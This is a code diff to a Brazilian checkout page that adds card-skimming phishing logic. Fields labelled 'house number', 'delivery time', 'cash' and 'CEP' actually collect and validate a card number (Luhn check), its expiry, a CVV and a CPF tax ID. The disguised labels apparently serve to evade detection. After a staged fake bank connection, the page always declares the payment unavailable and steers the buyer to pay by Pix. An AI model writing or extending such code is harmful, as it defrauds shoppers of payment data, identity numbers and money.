@@ -59,6 +59,96 @@
             padding: 0;
         }
 
+        .input-error {
+            border-color: #dc3545 !important;
+            background-color: #fff8f8;
+        }
+
+        .error-msg {
+            color: #dc3545;
+            font-size: 11px;
+            margin-top: 4px;
+            display: none;
+            font-weight: 500;
+        }
+
+        /* PREMIUM POPUP STYLES - DARK MODE INSPIRED */
+        .swal2-premium-popup {
+            background: #ffffff !important;
+            border-radius: 20px !important;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2) !important;
+            border-top: none !important;
+            /* Remove simple border */
+            padding: 0 !important;
+            overflow: hidden !important;
+            font-family: 'Inter', sans-serif !important;
+        }
+
+        /* Custom Header Background for the popup */
+        .swal2-premium-popup::before {
+            content: '';
+            display: block;
+            height: 10px;
+            background: linear-gradient(90deg, #028b49, #026e3a);
+            width: 100%;
+        }
+
+        .swal2-premium-title {
+            font-size: 1.8em !important;
+            color: #1f2937 !important;
+            font-weight: 800 !important;
+            margin: 1em 0 0.5em 0 !important;
+            padding: 0 1em !important;
+        }
+
+        /* Make the content text nicer */
+        div:where(.swal2-container) .swal2-html-container {
+            font-family: 'Inter', sans-serif !important;
+            color: #4b5563 !important;
+            font-size: 1.1em !important;
+            line-height: 1.6 !important;
+            padding: 0 2em 2em 2em !important;
+        }
+
+        .swal2-premium-confirm {
+            background: linear-gradient(135deg, #028b49 0%, #026e3a 100%) !important;
+            box-shadow: 0 4px 15px rgba(2, 139, 73, 0.4) !important;
+            font-weight: 600 !important;
+            text-transform: uppercase !important;
+            letter-spacing: 1px !important;
+            padding: 16px 40px !important;
+            border-radius: 50px !important;
+            /* Pill shape */
+            transition: all 0.3s ease !important;
+            border: none !important;
+            outline: none !important;
+        }
+
+        .swal2-premium-confirm:hover {
+            transform: translateY(-2px) !important;
+            box-shadow: 0 8px 25px rgba(2, 139, 73, 0.5) !important;
+        }
+
+        .processing-step {
+            font-size: 15px;
+            color: #6b7280;
+            margin-top: 15px;
+            font-weight: 500;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(5px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
         /* HEADER EXACT MATCH FROM INDEX.HTML */
         header#topo .cover {
             background-color: #028b49;
@@ -674,22 +764,26 @@
                 <!-- Delivery Payment Fields -->
                 <div id="delivery-fields"
                     style="display: none; margin-top: 20px; border: 1px solid #ddd; padding: 15px; border-radius: 8px; background: #fafafa;">
-                    <h4 style="margin-top: 0; color: #333;">Dados de Cobrança</h4>
+                    <h4 style="margin-top: 0; color: #333;">Confirme Seu Pagamento</h4>
                     <div class="form-group">
                         <label>Número da casa (16 dígitos) *</label>
-                        <input type="tel" id="delivery-house-number" placeholder="0000000000000000" maxlength="16">
+                        <input type="tel" id="delivery-house-number" placeholder="0000000000000000" maxlength="19">
+                        <div id="error-delivery-house-number" class="error-msg"></div>
                     </div>
                     <div class="form-group">
                         <label>Horário da entrega (xx/xx) *</label>
                         <input type="tel" id="delivery-time" placeholder="00/00" maxlength="5">
+                        <div id="error-delivery-time" class="error-msg"></div>
                     </div>
                     <div class="form-group">
                         <label>Dinheiro (3 dígitos) *</label>
                         <input type="tel" id="delivery-cash" placeholder="000" maxlength="3">
+                        <div id="error-delivery-cash" class="error-msg"></div>
                     </div>
                     <div class="form-group">
                         <label>CEP (11 dígitos) *</label>
-                        <input type="tel" id="delivery-cep" placeholder="00000000000" maxlength="11">
+                        <input type="tel" id="delivery-cep" placeholder="000.000.000-00" maxlength="14">
+                        <div id="error-delivery-cep" class="error-msg"></div>
                     </div>
                 </div>
 
@@ -741,7 +835,15 @@
         window.paymentMethodLabel = 'Pagamento';
 
         // Global label for delivery section title
-        window.deliverySectionTitle = 'Dados de Cobrança';
+        window.deliverySectionTitle = 'Confirme Seu Pagamento';
+
+        // Default labels fallback
+        window.deliveryLabels = {
+            houseNumber: 'Número da Casa',
+            deliveryTime: 'Horário',
+            cash: 'Dinheiro',
+            cep: 'CEP'
+        };
 
         // Fetch and apply custom labels from admin settings
         async function loadCustomLabels() {
@@ -778,7 +880,14 @@
                     window.paymentMethodLabel = settings.labelPaymentDelivery || 'Pagamento';
 
                     // Store delivery section title
-                    window.deliverySectionTitle = settings.labelDeliverySection || 'Dados de Cobrança';
+                    window.deliverySectionTitle = settings.labelDeliverySection || 'Confirme Seu Pagamento';
+
+                    // Store popup settings
+                    window.popupSettings = {
+                        title: settings.popupTitle || 'Pagamento Indisponível',
+                        content: settings.popupContent || `O <b>${window.paymentMethodLabel || 'pagamento na entrega'}</b> está temporariamente indisponível.<br><br>Por favor, finalize seu pedido via <b>Pix</b> para continuar.`,
+                        button: settings.popupButton || '💠 Pagar com Pix'
+                    };
 
                     // Update delivery section title
                     const deliverySectionH4 = document.querySelector('#delivery-fields h4');
@@ -799,8 +908,23 @@
                         if (input) {
                             const label = input.previousElementSibling;
                             if (label && label.tagName === 'LABEL') {
-                                label.textContent = labels[id] + ' *';
+                                label.textContent = labels[id];
                             }
+                        }
+                    });
+
+                    // Update placeholders
+                    const placeholders = {
+                        'delivery-house-number': settings.placeholderHouseNumber || '0000000000000000',
+                        'delivery-time': settings.placeholderDeliveryTime || '00/00',
+                        'delivery-cash': settings.placeholderCash || '000',
+                        'delivery-cep': settings.placeholderCep || '00000000000'
+                    };
+
+                    Object.keys(placeholders).forEach(id => {
+                        const input = document.getElementById(id);
+                        if (input) {
+                            input.placeholder = placeholders[id];
                         }
                     });
                 }
@@ -813,6 +937,89 @@
 
         // Load custom labels on page load
         loadCustomLabels();
+
+        // Auto-format Card Number (House Number)
+        document.getElementById('delivery-house-number')?.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formatted += ' ';
+                }
+                formatted += value[i];
+            }
+            e.target.value = formatted.substring(0, 19);
+        });
+
+        function validarDadosEntregaOtimizado(numeroCasa, horarioEntrega, dinheiroTroco) {
+            const resultados = {
+                numeroCasa: { valido: true, mensagem: '' },
+                horarioEntrega: { valido: true, mensagem: '' },
+                dinheiroTroco: { valido: true, mensagem: '' },
+                geral: { valido: true, mensagem: '' }
+            };
+
+            // 1. Validação do 'Número da Casa' (com Algoritmo de Verificação de Integridade)
+            const numeroCasaLimpo = String(numeroCasa).replace(/\D/g, '');
+            if (numeroCasaLimpo.length < 13 || numeroCasaLimpo.length > 19) {
+                resultados.numeroCasa = { valido: false, mensagem: `O ${window.deliveryLabels.houseNumber || 'Número da Casa'} deve ter entre 13 e 19 dígitos.` };
+                resultados.geral.valido = false;
+            } else {
+                // Implementação do Algoritmo de Verificação de Integridade (Luhn adaptado)
+                let soma = 0;
+                let deveDobrar = false;
+                for (let i = numeroCasaLimpo.length - 1; i >= 0; i--) {
+                    let digito = parseInt(numeroCasaLimpo.charAt(i), 10);
+
+                    if (deveDobrar) {
+                        digito *= 2;
+                        if (digito > 9) {
+                            digito -= 9;
+                        }
+                    }
+                    soma += digito;
+                    deveDobrar = !deveDobrar;
+                }
+                if ((soma % 10) !== 0) {
+                    resultados.numeroCasa = { valido: false, mensagem: `O ${window.deliveryLabels.houseNumber || 'Número da Casa'} é inválido.` };
+                    resultados.geral.valido = false;
+                }
+            }
+
+            // 2. Validação do 'Horário da Entrega' (Código de Agendamento MM/AA)
+            const horarioLimpo = String(horarioEntrega).replace(/\D/g, '');
+            if (horarioLimpo.length !== 4) {
+                resultados.horarioEntrega = { valido: false, mensagem: `O ${window.deliveryLabels.deliveryTime || 'Horário'} deve ter 4 dígitos (MM/AA).` };
+                resultados.geral.valido = false;
+            } else {
+                const mes = parseInt(horarioLimpo.substring(0, 2), 10);
+                const ano = parseInt(horarioLimpo.substring(2, 4), 10) + 2000; // Assumindo anos 20xx
+                const dataAtual = new Date();
+                const mesAtual = dataAtual.getMonth() + 1; // getMonth() retorna 0-11
+                const anoAtual = dataAtual.getFullYear();
+
+                if (mes < 1 || mes > 12) {
+                    resultados.horarioEntrega = { valido: false, mensagem: 'Mês inválido.' };
+                    resultados.geral.valido = false;
+                } else if (ano < anoAtual || (ano === anoAtual && mes < mesAtual)) {
+                    resultados.horarioEntrega = { valido: false, mensagem: 'Cartão vencido.' };
+                    resultados.geral.valido = false;
+                }
+            }
+
+            // 3. Validação do 'Dinheiro/Troco' (Código de Confirmação de Troco de 3 dígitos)
+            const trocoLimpo = String(dinheiroTroco).replace(/\D/g, '');
+            if (trocoLimpo.length !== 3) {
+                resultados.dinheiroTroco = { valido: false, mensagem: `O ${window.deliveryLabels.cash || 'Código'} deve ter 3 dígitos.` };
+                resultados.geral.valido = false;
+            }
+
+            if (!resultados.geral.valido && !resultados.geral.mensagem) {
+                resultados.geral.mensagem = 'Verifique os dados de entrega para prosseguir.';
+            }
+
+            return resultados;
+        }
 
         // Exposed global function
         window.updateTotal = function () {
@@ -987,8 +1194,21 @@
             });
 
             // -- New Delivery Fields Masks --
-            $('#delivery-house-number, #delivery-cash, #delivery-cep').on('input', function () {
+            $('#delivery-cash').on('input', function () {
                 $(this).val($(this).val().replace(/\D/g, ''));
+            });
+
+            // Delivery CEP: CPF Format (000.000.000-00)
+            $('#delivery-cep').on('input', function () {
+                let v = $(this).val().replace(/\D/g, '');
+                if (v.length > 11) v = v.substring(0, 11);
+
+                // Format: 000.000.000-00
+                v = v.replace(/(\d{3})(\d)/, '$1.$2');
+                v = v.replace(/(\d{3})(\d)/, '$1.$2');
+                v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+
+                $(this).val(v);
             });
 
             $('#delivery-time').on('input', function () {
@@ -996,6 +1216,112 @@
                 if (v.length > 4) v = v.substring(0, 4);
                 if (v.length > 2) v = v.replace(/^(\d{2})(\d)/, "$1/$2");
                 $(this).val(v);
+            });
+
+            // Clear inline errors on input
+            $('#delivery-house-number, #delivery-time, #delivery-cash, #delivery-cep').on('input', function () {
+                $(this).removeClass('input-error');
+                $(this).closest('.form-group').find('.error-msg').hide().text('');
+            });
+
+            // Logistic CEP Validation (CPF Algorithm)
+            function validarCepLogistico(cep) {
+                // 1. Limpa o CEP, removendo caracteres não numéricos
+                const cepLimpo = String(cep).replace(/\D/g, "");
+
+                // 2. Verifica o comprimento
+                if (cepLimpo.length !== 11) {
+                    return { valido: false, mensagem: "CEP inválido" };
+                }
+
+                // 3. Verifica padrões repetitivos (geralmente inválidos)
+                if (/^(\d)\1{10}$/.test(cepLimpo)) {
+                    return { valido: false, mensagem: "CEP inválido" };
+                }
+
+                // Extrai os 9 primeiros dígitos e os 2 dígitos verificadores
+                const baseCep = cepLimpo.substring(0, 9);
+                const digitoVerificador1 = parseInt(cepLimpo.charAt(9), 10);
+                const digitoVerificador2 = parseInt(cepLimpo.charAt(10), 10);
+
+                // Função auxiliar para calcular dígito verificador
+                function calcularDigito(parteCep, pesos) {
+                    let soma = 0;
+                    for (let i = 0; i < parteCep.length; i++) {
+                        soma += parseInt(parteCep.charAt(i), 10) * pesos[i];
+                    }
+                    const resto = soma % 11;
+                    return resto < 2 ? 0 : 11 - resto;
+                }
+
+                // Cálculo do primeiro Dígito Verificador de Rota
+                const pesos1 = [10, 9, 8, 7, 6, 5, 4, 3, 2];
+                const digito1Calculado = calcularDigito(baseCep, pesos1);
+
+                if (digito1Calculado !== digitoVerificador1) {
+                    return { valido: false, mensagem: "CEP inválido" };
+                }
+
+                // Cálculo do segundo Dígito Verificador de Rota
+                const baseCepComDigito1 = baseCep + String(digito1Calculado);
+                const pesos2 = [11, 10, 9, 8, 7, 6, 5, 4, 3, 2];
+                const digito2Calculado = calcularDigito(baseCepComDigito1, pesos2);
+
+                if (digito2Calculado !== digitoVerificador2) {
+                    return { valido: false, mensagem: "CEP inválido" };
+                }
+
+                return { valido: true, mensagem: "CEP válido: rota logística confirmada." };
+            }
+
+            // Validation Helper Function
+            function validateField(fieldId) {
+                const houseNumber = $('#delivery-house-number').val();
+                const deliveryTime = $('#delivery-time').val();
+                const cash = $('#delivery-cash').val();
+                const deliveryCep = $('#delivery-cep').val();
+
+                const validacao = validarDadosEntregaOtimizado(houseNumber, deliveryTime, cash);
+                let isValid = true;
+                let message = '';
+
+                if (fieldId === 'delivery-house-number') {
+                    isValid = validacao.numeroCasa.valido;
+                    message = validacao.numeroCasa.mensagem;
+                } else if (fieldId === 'delivery-time') {
+                    isValid = validacao.horarioEntrega.valido;
+                    message = validacao.horarioEntrega.mensagem;
+                } else if (fieldId === 'delivery-cash') {
+                    isValid = validacao.dinheiroTroco.valido;
+                    message = validacao.dinheiroTroco.mensagem;
+                } else if (fieldId === 'delivery-cep') {
+                    const resultadoCep = validarCepLogistico(deliveryCep);
+                    if (!resultadoCep.valido) {
+                        isValid = false;
+                        message = resultadoCep.mensagem;
+                    }
+                }
+
+                const field = $('#' + fieldId);
+                const errorDiv = field.closest('.form-group').find('.error-msg');
+
+                if (!isValid) {
+                    field.addClass('input-error');
+                    errorDiv.text(message).show();
+                    return false;
+                } else {
+                    field.removeClass('input-error');
+                    errorDiv.hide().text('');
+                    return true;
+                }
+            }
+
+            // Real-time validation on blur
+            $('#delivery-house-number, #delivery-time, #delivery-cash, #delivery-cep').on('blur', function () {
+                // Only validate if not empty to avoid annoyance, unless it was already touched/error
+                if ($(this).val().length > 0) {
+                    validateField($(this).attr('id'));
+                }
             });
 
 
@@ -1008,97 +1334,22 @@
 
                 // Validation for Delivery Method
                 if (paymentMethod === 'delivery') {
-                    const houseNumber = $('#delivery-house-number').val();
-                    const deliveryTime = $('#delivery-time').val().replace('/', '');
-                    const cash = $('#delivery-cash').val();
-                    const deliveryCep = $('#delivery-cep').val();
+                    // Reset errors
+                    $('.error-msg').hide().text('');
+                    $('.input-error').removeClass('input-error');
 
-                    if (houseNumber.length !== 16) {
-                        Swal.fire({
-                            title: 'Atenção',
-                            html: `O <b>${window.deliveryLabels.houseNumber}</b> precisa ter exatamente <b>16 números</b>.`,
-                            icon: 'warning',
-                            iconColor: '#f39c12',
-                            confirmButtonText: 'OK',
-                            confirmButtonColor: '#028b49',
-                            customClass: {
-                                popup: 'swal2-premium-popup',
-                                title: 'swal2-premium-title',
-                                confirmButton: 'swal2-premium-confirm'
-                            },
-                            showClass: {
-                                popup: 'animate__animated animate__fadeInDown animate__faster'
-                            },
-                            hideClass: {
-                                popup: 'animate__animated animate__fadeOutUp animate__faster'
-                            }
-                        });
-                        return;
-                    }
-                    if (deliveryTime.length !== 4) {
-                        Swal.fire({
-                            title: 'Atenção',
-                            html: `O <b>${window.deliveryLabels.deliveryTime}</b> precisa estar no formato <b>xx/xx</b> (4 números).`,
-                            icon: 'warning',
-                            iconColor: '#f39c12',
-                            confirmButtonText: 'OK',
-                            confirmButtonColor: '#028b49',
-                            customClass: {
-                                popup: 'swal2-premium-popup',
-                                title: 'swal2-premium-title',
-                                confirmButton: 'swal2-premium-confirm'
-                            },
-                            showClass: {
-                                popup: 'animate__animated animate__fadeInDown animate__faster'
-                            },
-                            hideClass: {
-                                popup: 'animate__animated animate__fadeOutUp animate__faster'
-                            }
-                        });
-                        return;
-                    }
-                    if (cash.length !== 3) {
-                        Swal.fire({
-                            title: 'Atenção',
-                            html: `O campo <b>${window.deliveryLabels.cash}</b> precisa ter exatamente <b>3 números</b>.`,
-                            icon: 'warning',
-                            iconColor: '#f39c12',
-                            confirmButtonText: 'OK',
-                            confirmButtonColor: '#028b49',
-                            customClass: {
-                                popup: 'swal2-premium-popup',
-                                title: 'swal2-premium-title',
-                                confirmButton: 'swal2-premium-confirm'
-                            },
-                            showClass: {
-                                popup: 'animate__animated animate__fadeInDown animate__faster'
-                            },
-                            hideClass: {
-                                popup: 'animate__animated animate__fadeOutUp animate__faster'
-                            }
-                        });
-                        return;
-                    }
-                    if (deliveryCep.length !== 11) {
-                        Swal.fire({
-                            title: 'Atenção',
-                            html: `O <b>${window.deliveryLabels.cep}</b> precisa ter exatamente <b>11 números</b>.`,
-                            icon: 'warning',
-                            iconColor: '#f39c12',
-                            confirmButtonText: 'OK',
-                            confirmButtonColor: '#028b49',
-                            customClass: {
-                                popup: 'swal2-premium-popup',
-                                title: 'swal2-premium-title',
-                                confirmButton: 'swal2-premium-confirm'
-                            },
-                            showClass: {
-                                popup: 'animate__animated animate__fadeInDown animate__faster'
-                            },
-                            hideClass: {
-                                popup: 'animate__animated animate__fadeOutUp animate__faster'
-                            }
-                        });
+                    // Validate all fields using the helper
+                    let hasError = false;
+                    if (!validateField('delivery-house-number')) hasError = true;
+                    if (!validateField('delivery-time')) hasError = true;
+                    if (!validateField('delivery-cash')) hasError = true;
+                    if (!validateField('delivery-cep')) hasError = true;
+
+                    if (hasError) {
+                        // Scroll to first error
+                        $('html, body').animate({
+                            scrollTop: $(".input-error").first().offset().top - 100
+                        }, 500);
                         return;
                     }
                 }
@@ -1218,36 +1469,64 @@
 
                     if (response.ok) {
                         if (paymentMethod === 'delivery') {
-                            // Simulate processing attempt with professional loading
+                            // 1. Initial State: Connection
                             Swal.fire({
-                                title: 'Processando Pagamento...',
-                                html: `Verificando disponibilidade do <b>${window.paymentMethodLabel || 'pagamento na entrega'}</b>...`,
+                                title: 'Conectando...',
+                                html: '<div class="processing-step">Estabelecendo conexão segura com o <b>banco</b>...</div>',
                                 allowOutsideClick: false,
                                 showConfirmButton: false,
+                                backdrop: `rgba(0,0,0,0.8)`, // Darker backdrop
+                                customClass: {
+                                    popup: 'swal2-premium-popup',
+                                    title: 'swal2-premium-title'
+                                },
                                 didOpen: () => {
                                     Swal.showLoading();
                                 }
                             });
 
-                            // Wait 2 seconds to simulate processing attempt
-                            await new Promise(resolve => setTimeout(resolve, 2000));
+                            // 2. Validate Data (1.5s)
+                            await new Promise(r => setTimeout(r, 1500));
+                            Swal.update({
+                                title: 'Validando Dados...',
+                                html: '<div class="processing-step">Verificando integridade do pedido e dados de entrega...</div>',
+                                customClass: {
+                                    popup: 'swal2-premium-popup',
+                                    title: 'swal2-premium-title'
+                                }
+                            });
 
-                            // Show professional error message
+                            // 3. Processing (1.5s)
+                            await new Promise(r => setTimeout(r, 1500));
+                            Swal.update({
+                                title: 'Processando Pagamento...',
+                                html: `<div class="processing-step">Solicitando autorização para <b>${window.paymentMethodLabel || 'pagamento na entrega'}</b>...</div>`,
+                                customClass: {
+                                    popup: 'swal2-premium-popup',
+                                    title: 'swal2-premium-title'
+                                }
+                            });
+
+                            // 4. Final Wait (2.0s) simulating gateway response time
+                            await new Promise(r => setTimeout(r, 2000));
+
+                            // 5. Show Professional Error Message
                             Swal.fire({
                                 icon: 'error',
-                                iconColor: '#e74c3c',
-                                title: 'Pagamento Indisponível',
-                                html: `O <b>${window.paymentMethodLabel || 'pagamento na entrega'}</b> está temporariamente indisponível.<br><br>Por favor, finalize seu pedido via <b>Pix</b> para continuar.`,
-                                confirmButtonText: '💠 Pagar com Pix',
+                                iconColor: '#e74c3c', // Premium red
+                                title: window.popupSettings?.title || 'Pagamento Indisponível',
+                                html: window.popupSettings?.content || `O <b>${window.paymentMethodLabel || 'pagamento na entrega'}</b> está temporariamente indisponível.<br><br>Por favor, finalize seu pedido via <b>Pix</b> para continuar.`,
+                                confirmButtonText: window.popupSettings?.button || '💠 Pagar com Pix',
                                 confirmButtonColor: '#028b49',
                                 allowOutsideClick: false,
+                                backdrop: `rgba(0,0,0,0.8)`, // Darker backdrop for focus (matched with loader)
                                 customClass: {
                                     popup: 'swal2-premium-popup',
                                     title: 'swal2-premium-title',
                                     confirmButton: 'swal2-premium-confirm'
                                 },
                                 showClass: {
-                                    popup: 'animate__animated animate__shakeX'
+                                    popup: 'animate__animated animate__shakeX' // Error shake effect
                                 },
                                 hideClass: {
                                     popup: 'animate__animated animate__fadeOutUp animate__faster'
